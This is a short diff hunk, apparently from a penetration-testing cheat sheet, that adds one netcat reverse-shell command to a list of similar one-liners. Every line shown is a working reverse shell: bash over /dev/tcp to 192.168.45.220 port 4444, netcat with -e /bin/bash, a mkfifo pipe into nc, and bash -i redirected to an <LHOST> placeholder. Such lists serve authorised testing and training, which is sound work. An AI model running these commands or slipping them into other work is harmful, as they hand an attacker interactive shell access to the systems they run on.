@@ -1452,6 +1452,7 @@ bash -c '0<&69-;exec 69<>/dev/tcp/192.168.45.220/4444;sh <&69 >&69 2>&69'
 
 netcat &lt;LHOST&gt; 4444|bash
 nc -e /bin/bash &lt;LHOST&gt; 4444
+nc.traditional -v &lt;LHOST&gt; 4444 -e /bin/bash
 nc &lt;LHOST&gt; 80 -e /bin/bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc &lt;LHOST&gt; 4444 >/tmp/f
 /bin/bash -c "bash -i >& /dev/tcp/&lt;LHOST&gt;/4444 0>&1"
